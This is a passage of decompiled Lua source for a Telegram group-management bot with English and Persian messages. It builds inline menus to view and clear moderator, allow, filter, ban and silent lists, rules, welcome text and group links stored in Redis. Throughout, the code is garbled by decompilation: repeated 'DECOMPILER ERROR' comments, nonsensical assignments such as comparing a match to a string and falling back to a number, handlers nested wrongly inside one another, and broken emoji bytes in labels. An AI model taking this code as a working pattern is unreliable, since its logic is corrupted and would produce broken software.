                                          get_alert(msg.cb_id, "Input Number is Not Correct!")
                                        else
                                          get_alert(msg.cb_id, "تعداد ورودی صحیح نیست!")
                                        end
                                      else
                                        if 10 <= _ENV.String - 100 then
                                          redis:hset("GroupSettings:" .. matches[2], "MaxWords", _ENV.String - 100)
                                        end
                                      end
                                      ;
                                      (_ENV.GetNumberSettings)(msg, matches[2])
                                      if not tonumber(redis:hget("GroupSettings:" .. matches[2], "MaxWords")) then
                                        _ENV.String = matches[1] ~= "-10MaxWords" or 50
                                        if _ENV.String - 10 < 10 then
                                          if not lang then
                                            get_alert(msg.cb_id, "Input Number is Not Correct!")
                                          else
                                            get_alert(msg.cb_id, "تعداد ورودی صحیح نیست!")
                                          end
                                        else
                                          if 10 <= _ENV.String - 10 then
                                            redis:hset("GroupSettings:" .. matches[2], "MaxWords", _ENV.String - 10)
                                          end
                                        end
                                        ;
                                        (_ENV.GetNumberSettings)(msg, matches[2])
                                        if not tonumber(redis:hget("GroupSettings:" .. matches[2], "MaxWords")) then
                                          _ENV.String = matches[1] ~= "+10MaxWords" or 50
                                          redis:hset("GroupSettings:" .. matches[2], "MaxWords", _ENV.String + 10)
                                          ;
                                          (_ENV.GetNumberSettings)(msg, matches[2])
                                          if not tonumber(redis:hget("GroupSettings:" .. matches[2], "MaxWords")) then
                                            _ENV.String = matches[1] ~= "+100MaxWords" or 50
                                            redis:hset("GroupSettings:" .. matches[2], "MaxWords", _ENV.String + 100)
                                            ;
                                            (_ENV.GetNumberSettings)(msg, matches[2])
                                            if not tonumber(redis:hget("GroupSettings:" .. matches[2], "ForcedInvite")) then
                                              _ENV.String = matches[1] ~= "-5Forced" or 2
                                              if _ENV.String - 5 < 1 then
                                                if not lang then
                                                  get_alert(msg.cb_id, "Input Number is Not Correct!")
                                                else
                                                  get_alert(msg.cb_id, "تعداد ورودی صحیح نیست!")
                                                end
                                              else
                                                if _ENV.String - 5 >= 1 then
                                                  redis:hset("GroupSettings:" .. matches[2], "ForcedInvite", _ENV.String - 5)
                                                end
                                              end
                                              ;
                                              (_ENV.GetNumberSettings)(msg, matches[2])
                                              if not tonumber(redis:hget("GroupSettings:" .. matches[2], "ForcedInvite")) then
                                                _ENV.String = matches[1] ~= "-1Forced" or 2
                                                if _ENV.String - 1 < 1 then
                                                  if not lang then
                                                    get_alert(msg.cb_id, "Input Number is Not Correct!")
                                                  else
                                                    get_alert(msg.cb_id, "تعداد ورودی صحیح نیست!")
                                                  end
                                                else
                                                  if _ENV.String - 1 >= 1 then
                                                    redis:hset("GroupSettings:" .. matches[2], "ForcedInvite", _ENV.String - 1)
                                                  end
                                                end
                                                ;
                                                (_ENV.GetNumberSettings)(msg, matches[2])
                                                if not tonumber(redis:hget("GroupSettings:" .. matches[2], "ForcedInvite")) then
                                                  _ENV.String = matches[1] ~= "+1Forced" or 2
                                                  redis:hset("GroupSettings:" .. matches[2], "ForcedInvite", _ENV.String + 1)
                                                  ;
                                                  (_ENV.GetNumberSettings)(msg, matches[2])
                                                  if not tonumber(redis:hget("GroupSettings:" .. matches[2], "ForcedInvite")) then
                                                    _ENV.String = matches[1] ~= "+5Forced" or 2
                                                    redis:hset("GroupSettings:" .. matches[2], "ForcedInvite", _ENV.String + 5)
                                                    ;
                                                    (_ENV.GetNumberSettings)(msg, matches[2])
                                                    _ENV.GetCleans = function(msg, chat)
    -- function num : 0_58_20 , upvalues : _ENV, lang
    if not is_owner(chat, (msg.from).id) then
      get_alert(msg.cb_id, ErrorAccess)
    else
      keyboard = {}
      if not lang then
        text = "(*Page 1*) `Please Use An item For Clean it:`"
        -- DECOMPILER ERROR at PC93: Confused about usage of register: R2 in 'UnsetPending'

        keyboard.inline_keyboard = {
{
{text = "Allow List", callback_data = "InfoAllow:" .. chat}
, 
{text = "🗑", callback_data = "CleanAllow:" .. chat}
}
, 
{
{text = "Filter List", callback_data = "InfoFilterList:" .. chat}
, 
{text = "🗑", callback_data = "CleanFilterList:" .. chat}
}
, 
{
{text = "Ban List", callback_data = "InfoBans:" .. chat}
, 
{text = "🗑", callback_data = "CleanBans:" .. chat}
}
, 
{
{text = "Silent List", callback_data = "InfoSilentList:" .. chat}
, 
{text = "🗑", callback_data = "CleanSilentList:" .. chat}
}
, 
{
{text = "2️⃣", callback_data = "Cleans2:" .. chat}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. chat}
}
}
      else
        text = "(صفحه 1)\n `لطفا یک بخش را برای پاکسازی آن انتخاب کنید:`"
        -- DECOMPILER ERROR at PC171: Confused about usage of register: R2 in 'UnsetPending'

        keyboard.inline_keyboard = {
{
{text = "لیست مجاز", callback_data = "InfoAllow:" .. chat}
, 
{text = "🗑", callback_data = "CleanAllow:" .. chat}
}
, 
{
{text = "لیست فیلتر", callback_data = "InfoFilterList:" .. chat}
, 
{text = "🗑", callback_data = "CleanFilterList:" .. chat}
}
, 
{
{text = "لیست محرومان", callback_data = "InfoBans:" .. chat}
, 
{text = "🗑", callback_data = "CleanBans:" .. chat}
}
, 
{
{text = "لیست کاربران ساکت", callback_data = "InfoSilentList:" .. chat}
, 
{text = "🗑", callback_data = "CleanSilentList:" .. chat}
}
, 
{
{text = "2️⃣", callback_data = "Cleans2:" .. chat}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. chat}
}
}
      end
      edit_inline(msg.message_id, text, keyboard)
    end
  end

                                                    _ENV.GetCleans2 = function(msg, chat)
    -- function num : 0_58_21 , upvalues : _ENV, lang
    if not is_owner(chat, (msg.from).id) then
      get_alert(msg.cb_id, ErrorAccess)
    else
      keyboard = {}
      if not lang then
        text = "(*Page 2*) `Please Use An item For Clean it:`"
        -- DECOMPILER ERROR at PC79: Confused about usage of register: R2 in 'UnsetPending'

        keyboard.inline_keyboard = {
{
{text = "Group Moderators", callback_data = "InfoMods:" .. chat}
, 
{text = "🗑", callback_data = "CleanMods:" .. chat}
}
, 
{
{text = "Group Rules", callback_data = "InfoRules:" .. chat}
, 
{text = "🗑", callback_data = "CleanRules:" .. chat}
}
, 
{
{text = "Group Welcome", callback_data = "InfoWelcome:" .. chat}
, 
{text = "🗑", callback_data = "CleanWelcome:" .. chat}
}
, 
{
{text = "1️⃣", callback_data = "Cleans:" .. chat}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. chat}
}
}
      else
        text = "(صفحه 2)\n`لطفا یک بخش را برای پاکسازی آن انتخاب کنید:`"
        -- DECOMPILER ERROR at PC143: Confused about usage of register: R2 in 'UnsetPending'

        keyboard.inline_keyboard = {
{
{text = "مدیران گروه", callback_data = "InfoMods:" .. chat}
, 
{text = "🗑", callback_data = "CleanMods:" .. chat}
}
, 
{
{text = "قوانین گروه", callback_data = "InfoRules:" .. chat}
, 
{text = "🗑", callback_data = "CleanRules:" .. chat}
}
, 
{
{text = "خوش آمد گویی گروه", callback_data = "InfoWelcome:" .. chat}
, 
{text = "🗑", callback_data = "CleanWelcome:" .. chat}
}
, 
{
{text = "1️⃣", callback_data = "Cleans:" .. chat}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. chat}
}
}
      end
      edit_inline(msg.message_id, text, keyboard)
    end
  end

                                                    if matches[1] == "Cleans" then
                                                      (_ENV.GetCleans)(msg, matches[2])
                                                      if not lang then
                                                        return "Clean Part > Page 1"
                                                      else
                                                        return "بخش پاکسازی > صفحه 1"
                                                      end
                                                    end
                                                    if matches[1] == "Cleans2" then
                                                      (_ENV.GetCleans2)(msg, matches[2])
                                                      if not lang then
                                                        return "Clean Part > Page 2"
                                                      else
                                                        return "بخش پاکسازی > صفحه 2"
                                                      end
                                                    end
                                                    if matches[1] == "CleanMods" and is_owner(matches[2], (msg.from).id) then
                                                      if data[(_ENV.tostring)(matches[2])] then
                                                        if ((_ENV.next)((data[(_ENV.tostring)(matches[2])]).mods)) == nil then
                                                          if not lang then
                                                            return "Moderator List is Empty!"
                                                          else
                                                            return "لیست مدیران خالی می باشد!"
                                                          end
                                                        end
                                                        for k,v in (_ENV.pairs)((data[(_ENV.tostring)(matches[2])]).mods) do
                                                          -- DECOMPILER ERROR at PC3427: Confused about usage of register: R9 in 'UnsetPending'

                                                          ((data[(_ENV.tostring)(matches[2])]).mods)[((_ENV.tostring)(k))] = nil
                                                          save_data("./data/moderation.json", data)
                                                        end
                                                        if not lang then
                                                          return "Cleaned!"
                                                        else
                                                          return "پاکسازی شد!"
                                                        end
                                                      else
                                                        if not lang then
                                                          return "Group is Not installed!"
                                                        else
                                                          return "گروه نصب نشده است!"
                                                        end
                                                      end
                                                    end
                                                    if matches[1] == "CleanAllow" and is_owner(matches[2], (msg.from).id) then
                                                      _ENV.listWord = redis:smembers("AllowFrom~" .. matches[2])
                                                      _ENV.listUser = redis:smembers("AllowUserFrom~" .. matches[2])
                                                      if #_ENV.listWord == 0 and #_ENV.listUser == 0 then
                                                        if not lang then
                                                          get_alert(msg.cb_id, "Allow List is Empty!")
                                                        else
                                                          get_alert(msg.cb_id, "لیست مجاز خالی می باشد!")
                                                        end
                                                      end
                                                      redis:del("AllowFrom~" .. matches[2])
                                                      redis:del("AllowUserFrom~" .. matches[2])
                                                      if not lang then
                                                        get_alert(msg.cb_id, "Cleaned!")
                                                      else
                                                        get_alert(msg.cb_id, "پاکسازی شد!")
                                                      end
                                                    end
                                                    if matches[1] == "CleanFilterList" and is_owner(matches[2], (msg.from).id) then
                                                      _ENV.filterlist = redis:smembers("GroupFilterList:" .. matches[2])
                                                      if #_ENV.filterlist == 0 then
                                                        if not lang then
                                                          get_alert(msg.cb_id, "Filter List is Empty!")
                                                        else
                                                          get_alert(msg.cb_id, "لیست فیلتر خالی می باشد!")
                                                        end
                                                      else
                                                        redis:del("GroupFilterList:" .. matches[2])
                                                        if not lang then
                                                          get_alert(msg.cb_id, "Cleaned!")
                                                        else
                                                          get_alert(msg.cb_id, "پاکسازی شد!")
                                                        end
                                                      end
                                                    end
                                                    if matches[1] == "CleanRules" and is_owner(matches[2], (msg.from).id) then
                                                      if not redis:hget("GroupSettings:" .. matches[2], "rules") then
                                                        if not lang then
                                                          get_alert(msg.cb_id, "Rules is Empty!")
                                                        else
                                                          get_alert(msg.cb_id, "قوانین خالی می باشد!")
                                                        end
                                                      end
                                                      redis:hdel("GroupSettings:" .. matches[2], "rules")
                                                      if not lang then
                                                        get_alert(msg.cb_id, "Cleaned!")
                                                      else
                                                        get_alert(msg.cb_id, "پاکسازی شد!")
                                                      end
                                                    end
                                                    if matches[1] == "CleanWelcome" and is_owner(matches[2], (msg.from).id) then
                                                      if not redis:get("GroupWelcome" .. matches[2]) then
                                                        if not lang then
                                                          get_alert(msg.cb_id, "Welcome is Empty!")
                                                        else
                                                          get_alert(msg.cb_id, "خوش آمد گویی خالی می باشد!")
                                                        end
                                                      end
                                                      redis:del("GroupWelcome" .. matches[2])
                                                      if not lang then
                                                        get_alert(msg.cb_id, "Cleaned!")
                                                      else
                                                        get_alert(msg.cb_id, "پاکسازی شد!")
                                                      end
                                                    end
                                                    if matches[1] == "CleanBans" and is_owner(matches[2], (msg.from).id) then
                                                      _ENV.Gbans = redis:smembers("GroupBannedUsers:" .. matches[2])
                                                      if #_ENV.Gbans == 0 then
                                                        if not lang then
                                                          return "`Ban List is Empty!`"
                                                        else
                                                          return "`لیست محرومان خالی می باشد!`"
                                                        end
                                                      end
                                                      redis:del("GroupBannedUsers:" .. matches[2])
                                                      if not lang then
                                                        get_alert(msg.cb_id, "Cleaned!")
                                                      else
                                                        get_alert(msg.cb_id, "پاکسازی شد!")
                                                      end
                                                    end
                                                    if matches[1] == "CleanSilentList" and is_owner(matches[2], (msg.from).id) then
                                                      _ENV.GetSilentList = redis:smembers("GroupSilentUsers:" .. matches[2])
                                                      if #_ENV.GetSilentList == 0 then
                                                        if not lang then
                                                          get_alert(msg.cb_id, "Silent List is Empty!")
                                                        else
                                                          get_alert(msg.cb_id, "لیست کاربران ساکت خالی می باشد!")
                                                        end
                                                      end
                                                      redis:del("GroupSilentUsers:" .. matches[2])
                                                      if not lang then
                                                        get_alert(msg.cb_id, "Cleaned!")
                                                      else
                                                        get_alert(msg.cb_id, "پاکسازی شد!")
                                                      end
                                                    end
                                                    if matches[1] == "Info" then
                                                      keyboard = {}
                                                      if not lang then
                                                        text = "`Please Use a Button For open it:`"
                                                        -- DECOMPILER ERROR at PC3874: Confused about usage of register: R4 in 'UnsetPending'

                                                        keyboard.inline_keyboard = {
{
{text = "🛂 Rules", callback_data = "InfoRules:" .. matches[2]}
, 
{text = "🗣 Welcome", callback_data = "InfoWelcome:" .. matches[2]}
}
, 
{
{text = "🌐 Group Link", callback_data = "InfoLink:" .. matches[2]}
, 
{text = "👮�\141 Moderators", callback_data = "InfoMods:" .. matches[2]}
}
, 
{
{text = "�\133 Allow List", callback_data = "InfoAllow:" .. matches[2]}
, 
{text = "⚠️ Filter List", callback_data = "InfoFilterList:" .. matches[2]}
}
, 
{
{text = "⚠️ Silent List", callback_data = "InfoSilentList:" .. matches[2]}
, 
{text = "🚷 Ban List", callback_data = "InfoBans:" .. matches[2]}
}
, 
{
{text = "�\179 Expire", callback_data = "InfoExpire:" .. matches[2]}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. matches[2]}
}
}
                                                      else
                                                        text = "`لطفا یک دکمه را برای باز کردن آن انتخاب کنید:`"
                                                        -- DECOMPILER ERROR at PC3963: Confused about usage of register: R4 in 'UnsetPending'

                                                        keyboard.inline_keyboard = {
{
{text = "🛂 قوانین", callback_data = "InfoRules:" .. matches[2]}
, 
{text = "🗣 خوش آمد گویی", callback_data = "InfoWelcome:" .. matches[2]}
}
, 
{
{text = "🌐 لینک گروه", callback_data = "InfoLink:" .. matches[2]}
, 
{text = "👮 مدیران", callback_data = "InfoMods:" .. matches[2]}
}
, 
{
{text = "�\133 لیست مجاز", callback_data = "InfoAllow:" .. matches[2]}
, 
{text = "⚠️ لیست فیلتر", callback_data = "InfoFilterList:" .. matches[2]}
}
, 
{
{text = "🤐 لیست افراد ساکت", callback_data = "InfoSilentList:" .. matches[2]}
, 
{text = "🚷 لیست محرومان", callback_data = "InfoBans:" .. matches[2]}
}
, 
{
{text = "�\179 انقضا", callback_data = "InfoExpire:" .. matches[2]}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. matches[2]}
}
}
                                                      end
                                                      edit_inline(msg.message_id, text, keyboard)
                                                    end
                                                    if matches[1] == "InfoRules" then
                                                      keyboard = {}
                                                      if not redis:hget("GroupSettings:" .. matches[2], "rules") then
                                                        text = lang or "Rules:\n*1-*`Do not spam`\n*2-*`Do not use filtered words`\n*3-*`Do not send +18 photos`"
                                                        -- DECOMPILER ERROR at PC4027: Confused about usage of register: R4 in 'UnsetPending'

                                                        keyboard.inline_keyboard = {
{
{text = "Help For This Part", callback_data = "HelpRules:" .. matches[2]}
}
, 
{
{text = "Reset To Default", callback_data = "CleanRules:" .. matches[2]}
}
, 
{
{text = "Back To Group info", callback_data = "Info:" .. matches[2]}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. matches[2]}
}
}
                                                        text = redis:hget("GroupSettings:" .. matches[2], "rules") or "قوانین:\n*1-*`اسپم نکنید`\n*2-*`از کلمات فیلتر شده استفاده نکنید`\n*3-*`عکس های +18 ارسال نکنید`"
                                                        -- DECOMPILER ERROR at PC4079: Confused about usage of register: R4 in 'UnsetPending'

                                                        keyboard.inline_keyboard = {
{
{text = "راهنما این بخش", callback_data = "HelpRules:" .. matches[2]}
}
, 
{
{text = "بازگردانی به پیشفرض", callback_data = "CleanRules:" .. matches[2]}
}
, 
{
{text = "برگشت به اطلاعات گروه", callback_data = "Info:" .. matches[2]}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. matches[2]}
}
}
                                                        edit_inline(msg.message_id, text, keyboard)
                                                        if matches[1] == "InfoWelcome" then
                                                          keyboard = {}
                                                          if not redis:get("GroupWelcome" .. matches[2]) then
                                                            text = lang or "Welcome To GPNAME Group"
                                                            -- DECOMPILER ERROR at PC4142: Confused about usage of register: R4 in 'UnsetPending'

                                                            keyboard.inline_keyboard = {
{
{text = "Help For This Part", callback_data = "HelpWelcome:" .. matches[2]}
}
, 
{
{text = "Reset To Default", callback_data = "CleanWelcome:" .. matches[2]}
}
, 
{
{text = "Back To Group info", callback_data = "Info:" .. matches[2]}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. matches[2]}
}
}
                                                            text = redis:get("GroupWelcome" .. matches[2]) or "به گروه GPNAME خوش آمدید"
                                                            -- DECOMPILER ERROR at PC4193: Confused about usage of register: R4 in 'UnsetPending'

                                                            keyboard.inline_keyboard = {
{
{text = "راهنما این بخش", callback_data = "HelpWelcome:" .. matches[2]}
}
, 
{
{text = "بازگردانی به پیشفرض", callback_data = "CleanWelcome:" .. matches[2]}
}
, 
{
{text = "برگشت به اطلاعات گروه", callback_data = "Info:" .. matches[2]}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. matches[2]}
}
}
                                                            edit_inline(msg.message_id, text, keyboard)
                                                            if matches[1] == "InfoLink" then
                                                              keyboard = {}
                                                              if not redis:hget("GroupSettings:" .. matches[2], "GroupLink") then
                                                                text = lang or "Group Link:\n*Not Found!*"
                                                                -- DECOMPILER ERROR at PC4248: Confused about usage of register: R4 in 'UnsetPending'

                                                                keyboard.inline_keyboard = {
{
{text = "Help For This Part", callback_data = "HelpLink:" .. matches[2]}
}
, 
{
{text = "Back To Group info", callback_data = "Info:" .. matches[2]}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. matches[2]}
}
}
                                                                text = redis:hget("GroupSettings:" .. matches[2], "GroupLink") or "لینک گروه:\n*پیدا نشد!*"
                                                                -- DECOMPILER ERROR at PC4291: Confused about usage of register: R4 in 'UnsetPending'

                                                                keyboard.inline_keyboard = {
{
{text = "راهنما این بخش", callback_data = "HelpLink:" .. matches[2]}
}
, 
{
{text = "برگشت به اطلاعات گروه", callback_data = "Info:" .. matches[2]}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. matches[2]}
}
}
                                                                edit_inline(msg.message_id, text, keyboard)
                                                                if matches[1] == "InfoMods" then
                                                                  keyboard = {}
                                                                  if not lang then
                                                                    if data[(_ENV.tostring)(matches[2])] then
                                                                      if ((_ENV.next)((data[(_ENV.tostring)(matches[2])]).mods)) == nil then
                                                                        text = "`No Moderator in This Group!`"
                                                                      end
                                                                      _ENV.i = 1
                                                                      text = "`Moderators:`\n"
                                                                      for k,v in (_ENV.pairs)((data[(_ENV.tostring)(matches[2])]).mods) do
                                                                        text = text .. _ENV.i .. "- " .. v .. " [" .. k .. "]\n"
                                                                        _ENV.i = _ENV.i + 1
                                                                      end
                                                                    else
                                                                      do
                                                                        text = "Group is Not installed!"
                                                                        -- DECOMPILER ERROR at PC4401: Confused about usage of register: R4 in 'UnsetPending'

                                                                        keyboard.inline_keyboard = {
{
{text = "Help For This Part", callback_data = "HelpMods:" .. matches[2]}
}
, 
{
{text = "Clean This List", callback_data = "CleanMods:" .. matches[2]}
}
, 
{
{text = "Back To Group info", callback_data = "Info:" .. matches[2]}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. matches[2]}
}
}
                                                                        if data[(_ENV.tostring)(matches[2])] then
                                                                          _ENV.i = 1
                                                                          if ((_ENV.next)((data[(_ENV.tostring)(matches[2])]).mods)) == nil then
                                                                            text = "`مدیری در این گروه وجود ندارد!`"
                                                                          end
                                                                          text = "`مدیران:`\n"
                                                                          for k,v in (_ENV.pairs)((data[(_ENV.tostring)(matches[2])]).mods) do
                                                                            text = text .. _ENV.i .. "- " .. v .. " [" .. k .. "]\n"
                                                                            _ENV.i = _ENV.i + 1
                                                                          end
                                                                        else
                                                                          do
                                                                            text = "گروه نصب نشده است!"
                                                                            -- DECOMPILER ERROR at PC4499: Confused about usage of register: R4 in 'UnsetPending'

                                                                            keyboard.inline_keyboard = {
{
{text = "راهنما این بخش", callback_data = "HelpMods:" .. matches[2]}
}
, 
{
{text = "پاکسازی این لیست", callback_data = "CleanMods:" .. matches[2]}
}
, 
{
{text = "برگشت به اطلاعات گروه", callback_data = "Info:" .. matches[2]}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. matches[2]}
}
}
                                                                            edit_inline(msg.message_id, text, keyboard)
                                                                            if matches[1] == "InfoAllow" then
                                                                              keyboard = {}
                                                                              if not lang then
                                                                                _ENV.hashWord = "AllowFrom~" .. matches[2]
                                                                                _ENV.listWord = redis:smembers(_ENV.hashWord)
                                                                                _ENV.hashUser = "AllowUserFrom~" .. matches[2]
                                                                                _ENV.listUser = redis:smembers(_ENV.hashUser)
                                                                                _ENV.textWord = "*> Allow words:*\n\n"
                                                                                _ENV.textUser = "*> Allow users:*\n\n"
                                                                                for k,v in (_ENV.pairs)(_ENV.listWord) do
                                                                                  _ENV.textWord = _ENV.textWord .. "*" .. k .. "-* " .. v .. "\n\n"
                                                                                end
                                                                                for k,v in (_ENV.pairs)(_ENV.listUser) do
                                                                                  _ENV.textUser = _ENV.textUser .. "*" .. k .. "-* `" .. v .. "`\n\n"
                                                                                end
                                                                                if #_ENV.listWord == 0 then
                                                                                  _ENV.textWord = "*> Allow words not found!*\n\n"
                                                                                end
                                                                                if #_ENV.listUser == 0 then
                                                                                  _ENV.textUser = "*> Allow users not found!*\n\n"
                                                                                end
                                                                                text = _ENV.textWord .. _ENV.textUser
                                                                                -- DECOMPILER ERROR at PC4644: Confused about usage of register: R4 in 'UnsetPending'

                                                                                keyboard.inline_keyboard = {
{
{text = "Help For This Part", callback_data = "HelpAllow:" .. matches[2]}
}
, 
{
{text = "Clean This List", callback_data = "CleanAllow:" .. matches[2]}
}
, 
{
{text = "Back To Group info", callback_data = "Info:" .. matches[2]}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. matches[2]}
}
}
                                                                              else
                                                                                _ENV.hashWord = "AllowFrom~" .. matches[2]
                                                                                _ENV.listWord = redis:smembers(_ENV.hashWord)
                                                                                _ENV.hashUser = "AllowUserFrom~" .. matches[2]
                                                                                _ENV.listUser = redis:smembers(_ENV.hashUser)
                                                                                _ENV.textWord = "*> لغات مجاز:*\n\n"
                                                                                _ENV.textUser = "*> اشخاص مجاز:*\n\n"
                                                                                for k,v in (_ENV.pairs)(_ENV.listWord) do
                                                                                  _ENV.textWord = _ENV.textWord .. "*" .. k .. "-* " .. v .. "\n\n"
                                                                                end
                                                                                for k,v in (_ENV.pairs)(_ENV.listUser) do
                                                                                  _ENV.textUser = _ENV.textUser .. "*" .. k .. "-* `" .. v .. "`\n\n"
                                                                                end
                                                                                if #_ENV.listWord == 0 then
                                                                                  _ENV.textWord = "*> لغات مجاز یافت نشدند!*\n\n"
                                                                                end
                                                                                if #_ENV.listUser == 0 then
                                                                                  _ENV.textUser = "*> اشخاص مجاز یافت نشدند!*\n\n"
                                                                                end
                                                                                text = _ENV.textWord .. _ENV.textUser
                                                                                -- DECOMPILER ERROR at PC4777: Confused about usage of register: R4 in 'UnsetPending'

                                                                                keyboard.inline_keyboard = {
{
{text = "راهنما این بخش", callback_data = "HelpAllow:" .. matches[2]}
}
, 
{
{text = "پاکسازی این لیست", callback_data = "CleanAllow:" .. matches[2]}
}
, 
{
{text = "برگشت به اطلاعات گروه", callback_data = "Info:" .. matches[2]}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. matches[2]}
}
}
                                                                              end
                                                                              edit_inline(msg.message_id, text, keyboard)
                                                                            end
                                                                            if matches[1] == "InfoFilterList" then
                                                                              keyboard = {}
                                                                              if not lang then
                                                                                _ENV.FF = redis:smembers("GroupFilterList:" .. matches[2])
                                                                                if #_ENV.FF == 0 then
                                                                                  text = "`Filter List is Empty`"
                                                                                else
                                                                                  text = "`Filter List:`\n"
                                                                                  for k,v in (_ENV.pairs)(_ENV.FF) do
                                                                                    text = text .. "`" .. k .. "`- " .. v .. "\n"
                                                                                  end
                                                                                end
                                                                                do
                                                                                  -- DECOMPILER ERROR at PC4866: Confused about usage of register: R4 in 'UnsetPending'

                                                                                  keyboard.inline_keyboard = {
{
{text = "Help For This Part", callback_data = "HelpFilterList:" .. matches[2]}
}
, 
{
{text = "Clean This List", callback_data = "CleanFilterList:" .. matches[2]}
}
, 
{
{text = "Back To Group info", callback_data = "Info:" .. matches[2]}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. matches[2]}
}
}
                                                                                  _ENV.FF = redis:smembers("GroupFilterList:" .. matches[2])
                                                                                  if #_ENV.FF == 0 then
                                                                                    text = "`لیست فیلتر خالی می باشد`"
                                                                                  else
                                                                                    text = "`لیست فیلتر:`\n"
                                                                                    for k,v in (_ENV.pairs)(_ENV.FF) do
                                                                                      text = text .. "`" .. k .. "`- " .. v .. "\n"
                                                                                    end
                                                                                  end
                                                                                  do
                                                                                    -- DECOMPILER ERROR at PC4943: Confused about usage of register: R4 in 'UnsetPending'

                                                                                    keyboard.inline_keyboard = {
{
{text = "راهنما این بخش", callback_data = "HelpFilterList:" .. matches[2]}
}
, 
{
{text = "پاکسازی این لیست", callback_data = "CleanFilterList:" .. matches[2]}
}
, 
{
{text = "برگشت به اطلاعات گروه", callback_data = "Info:" .. matches[2]}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. matches[2]}
}
}
                                                                                    edit_inline(msg.message_id, text, keyboard)
                                                                                    if matches[1] == "InfoSilentList" then
                                                                                      keyboard = {}
                                                                                      if not lang then
                                                                                        _ENV.GetSilentList = redis:smembers("GroupSilentUsers:" .. matches[2])
                                                                                        if #_ENV.GetSilentList == 0 then
                                                                                          text = "`Silent List is Empty`"
                                                                                        else
                                                                                          text = "`Silent List:`\n"
                                                                                          for k,v in (_ENV.pairs)(_ENV.GetSilentList) do
                                                                                            text = text .. k .. "- " .. v .. "\n"
                                                                                          end
                                                                                        end
                                                                                        do
                                                                                          -- DECOMPILER ERROR at PC5031: Confused about usage of register: R4 in 'UnsetPending'

                                                                                          keyboard.inline_keyboard = {
{
{text = "Help For This Part", callback_data = "HelpSilentList:" .. matches[2]}
}
, 
{
{text = "Clean This List", callback_data = "CleanSilentList:" .. matches[2]}
}
, 
{
{text = "Back To Group info", callback_data = "Info:" .. matches[2]}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. matches[2]}
}
}
                                                                                          _ENV.GetSilentList = redis:smembers("GroupSilentUsers:" .. matches[2])
                                                                                          if #_ENV.GetSilentList == 0 then
                                                                                            text = "`لیست کاربران ساکت شده خالی می باشد`"
                                                                                          else
                                                                                            text = "`لیست کاربران ساکت شده:`\n"
                                                                                            for k,v in (_ENV.pairs)(_ENV.GetSilentList) do
                                                                                              text = text .. k .. "- " .. v .. "\n"
                                                                                            end
                                                                                          end
                                                                                          do
                                                                                            -- DECOMPILER ERROR at PC5107: Confused about usage of register: R4 in 'UnsetPending'

                                                                                            keyboard.inline_keyboard = {
{
{text = "راهنما این بخش", callback_data = "HelpSilentList:" .. matches[2]}
}
, 
{
{text = "پاکسازی این لیست", callback_data = "CleanSilentList:" .. matches[2]}
}
, 
{
{text = "برگشت به اطلاعات گروه", callback_data = "Info:" .. matches[2]}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. matches[2]}
}
}
                                                                                            edit_inline(msg.message_id, text, keyboard)
                                                                                            if matches[1] == "InfoBans" then
                                                                                              keyboard = {}
                                                                                              if not lang then
                                                                                                _ENV.Gbans = redis:smembers("GroupBannedUsers:" .. matches[2])
                                                                                                if #_ENV.Gbans == 0 then
                                                                                                  text = "Ban List is Empty!"
                                                                                                else
                                                                                                  text = "`Ban List:`\n\n"
                                                                                                  for k,v in (_ENV.pairs)(_ENV.Gbans) do
                                                                                                    text = text .. k .. "- " .. v .. "\n"
                                                                                                  end
                                                                                                end
                                                                                                do
                                                                                                  -- DECOMPILER ERROR at PC5195: Confused about usage of register: R4 in 'UnsetPending'

                                                                                                  keyboard.inline_keyboard = {
{
{text = "Help For This Part", callback_data = "HelpBans:" .. matches[2]}
}
, 
{
{text = "Clean This List", callback_data = "CleanBans:" .. matches[2]}
}
, 
{
{text = "Back To Group info", callback_data = "Info:" .. matches[2]}
}
, 
{
{text = "�\177 Back To Manager", callback_data = "Manager:" .. matches[2]}
}
}
                                                                                                  _ENV.Gbans = redis:smembers("GroupBannedUsers:" .. matches[2])
                                                                                                  if #_ENV.Gbans == 0 then
                                                                                                    text = "لیست محرومان خالی می باشد!"
                                                                                                  else
                                                                                                    text = "`لیست محرومان:`\n\n"
                                                                                                    for k,v in (_ENV.pairs)(_ENV.Gbans) do
                                                                                                      text = text .. k .. "- " .. v .. "\n"
                                                                                                    end
                                                                                                  end
                                                                                                  do
                                                                                                    -- DECOMPILER ERROR at PC5271: Confused about usage of register: R4 in 'UnsetPending'

                                                                                                    keyboard.inline_keyboard = {
{
{text = "راهنما این بخش", callback_data = "HelpBans:" .. matches[2]}
}
, 
{
{text = "پاکسازی این لیست", callback_data = "CleanBans:" .. matches[2]}
}
, 
{
{text = "برگشت به اطلاعات گروه", callback_data = "Info:" .. matches[2]}
}
, 
{
{text = "برگشت به مدیریت �\177", callback_data = "Manager:" .. matches[2]}
}
}
                                                                                                    edit_inline(msg.message_id, text, keyboard)
                                                                                                    if matches[1] == "InfoExpire" then
                                                                                                      keyboard = {}
                                                                                                      if not redis:ttl("ExpireDate:" .. matches[2]) then
                                                                                                        _ENV.expire = lang or 0
                                                                                                        _ENV.days = ((_ENV.math).floor)(_ENV.expire / 86400) + 1
                                                                                                        text = "Expire: `" .. _ENV.days .. "`"
